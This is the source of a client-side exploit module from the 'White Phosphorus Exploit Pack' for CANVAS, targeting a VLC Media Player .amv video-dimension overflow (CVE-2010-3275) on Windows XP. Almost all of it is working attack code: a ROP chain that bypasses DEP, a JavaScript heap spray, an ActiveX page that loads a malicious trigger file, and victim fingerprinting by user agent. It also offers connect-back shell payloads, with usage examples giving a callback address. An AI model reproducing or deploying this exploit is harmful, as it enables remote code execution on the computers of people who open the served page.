
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

from exploitutils import *
from tcpexploit import *

from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

from pelib import PElib

######################################################################################
NAME = "VLC Media Player v1.1.4-1.1.7 .amv Large Video Dimension Overflow"
DESCRIPTION = "A remote overflow in VLC Media Player v1.1.4-1.1.7"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='VideoLAN'
DOCUMENTATION["Date public"] = "2011-03-23"
DOCUMENTATION["References"] = "http://osvdb.org/show/osvdb/71277"
DOCUMENTATION['CVE Name']="CVE-2010-3275"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-3275'
DOCUMENTATION['CVSS'] = '6.8'
DOCUMENTATION["Repeatability"] = "Unlimited"                  
DOCUMENTATION['CVE'] = ""
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION["Notes"] = """
This is a client-side exploit - so use it via clientd or httpserver.
This exploit targets XP only, ASLR prevents exploitation on later versions of Windows.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "Vista", "7"]
PROPERTY['DELIVERY'] = 'HTTP'


NOTES="""
This is a client-side exploit - so use it via clientd or httpserver.

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> VLC Media Player v1.1.4-1.1.7 .amv Large Video Dimension Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows XP Universal (DEP)

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_vlc_mediaplayer_amv/wp_vlc_mediaplayer_amv.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################


# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows XP Universal (DEP)", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.encode_printable = True
        self.alignstack = True
        self.badstring = "\x00\x09\x0a\x0b\x0c\x0d\x22\x5c"
        
        #Randomize name for clientd
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html" 
        self.amv_filename ="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".amv" 
                
        # HTTP Custom Stuff
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        return

    def is_vulnerable(self, info_dict):
        # Called from ClientD, returns a value used to rank the exploit within attacking modules
        """
        Check for IE 6
        """
        self.isClientD = True
        if "MSIE 6.0" in info_dict['user_agent']:
            self.log("WP> Target has MSIE 6")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] #it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # If Called from clientD, update shellcode accordingly
        if self.isClientD:    
            if self.useSSLMOSDEF:
                self.DEFAULT_PAYLOAD = 1
            else:
                self.DEFAULT_PAYLOAD = 2
            
        # Selected shell options
        self.wp_getShellcodeType()
        
        # If called from clientD there will be no target here
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makefile(self):
        trigger = open('3rdparty/White_Phosphorus/exploits/wp_vlc_mediaplayer_amv/amv_trigger.amv','rb').read()
	
        outputfile = wp_outputpath(self.amv_filename)
        self.log("WP> Opening %s for output"%outputfile)
        fd=file(outputfile,'wb+')
        fd.write(trigger)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
	
        selfPtr = 0x64FE8340
	
        depbypass = pack('<L', 0x64FCE505)  # pop / pop / pop / pop / pop / ret
        depbypass += pack('<L', 0x00000040) # flNewProtect
        depbypass += pack('<L', 0x00001000) # dwSize
        depbypass += pack('<L', 0x64FF52D4) # VP-8
        depbypass += pack('<L', 0x64FCCEAE) # pop ebp / ret 
        depbypass += wp_randomstring(4)     # ebp gets munged here
        depbypass += pack('<L', 0x64FCB26B) # pop eax
        depbypass += pack('<L', selfPtr)    # Readable
        depbypass += wp_randomstring(4)     #
        depbypass += pack('<L', 0x64FE628B) # xchg eax, ecx
        depbypass += pack('<L', 0x64FCB26B) # pop eax / pop ebp / ret
        depbypass += pack('<L', selfPtr)    # readable 
        depbypass += pack('<L', 0x64FCCE98) # call [ebp+8]
        depbypass += pack('<L', 0x64FDB4EC) # pushad / ret
        depbypass += wp_randomstring(420)
        depbypass += pack('<L', 0x6E04CDF2) # push esp / ret
        depbypass += self.shellcode
	
        heapspraycode = pack('<L', 0x64FC53AF) # pop; ret
        heapspraycode += pack('<L', 0x64FC9B51) # push edx; pop esp
	
        
        #Base filedata
        filedata="""<html>
<script language="JavaScript">
memory = new Array();
shellcode =  unescape("SHELLCODE");
//var len = shellcode.length + 0x21; //0x21 is heap header
var len=0

var heapspray = unescape("HEAPSPRAYCODE");         

while(heapspray.length < 0x120000) heapspray += heapspray; 
heapspray = heapspray.substring(0, 0x120000 - len);

prefix = unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 
prefix += unescape("%u1111%u1111%u1111%u1111%u1111%u1111%u1111%u1111"); 

heapspray = prefix + heapspray; 
heapspray += unescape("DEPBYPASSCODE") + shellcode;

try{ 
for(var i = 0; i < 400; i++) { 
  memory[i]= heapspray.substring(0,heapspray.length); 
}   
}
catch(err)
{}
</script><body>
<object classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921"
codebase="http://downloads.videolan.org/pub/videolan/vlc/latest/win32/axvlc.cab"
width="0" height="0" events="True">
<param name="Src" value="TRIGGER"></param>
<param name="ShowDisplay" value="False" ></param>
<param name="AutoLoop" value="no"></param>
<param name="AutoPlay" value="yes"></param>
</object>
</body>
</html>"""
        filedata = filedata.replace('SHELLCODE',wp_urluencode(wp_randomnops(4) + self.shellcode + ("\x00" * 100)))
        filedata = filedata.replace('HEAPSPRAYCODE',wp_urluencode(heapspraycode))
        filedata = filedata.replace('DEPBYPASSCODE',wp_urluencode(depbypass))
        filedata = filedata.replace('TRIGGER', self.amv_filename)
        
        return filedata

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
    
        self.log('WP> User agent of connecting host: %s' % user_agent)        
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit file')

            data=self.makefile()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        return h,b

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
